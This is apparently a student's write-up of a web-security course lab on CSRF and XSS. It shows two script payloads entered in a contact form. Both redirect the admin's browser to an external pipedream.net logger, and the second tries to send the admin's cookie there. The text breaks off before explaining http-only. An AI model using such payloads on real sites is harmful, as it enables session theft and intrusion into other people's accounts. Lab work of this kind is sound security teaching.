# SLH lab 1

## 2 Basic CSRF

### 2.1. The website is also vulnerable to an XSS. How can you detect it?

Using *pipedream.com*, we log the requests that are sent to `https://eobnzz43rvm4g8a.m.pipedream.net`

In the contact form, we send this message :

```
<script>window.location.href = "https://eobnzz43rvm4g8a.m.pipedream.net?bonjour=bonjour";</script>
```

In pipedream we see that a request was received with the param `bonjour=bonjour`, so we know that the script in our message was sent by the vulnerable server to the admin.

### 2.2. Try to exfiltrate the admin cookie with the XSS. It does not work because of http-only. Explain what is http-only and how it prevents the exfiltration.

In the contact form, we send this message :

```
<script>window.location.href = "https://eobnzz43rvm4g8a.m.pipedream.net?cookie="+document.cookie;</script>
```
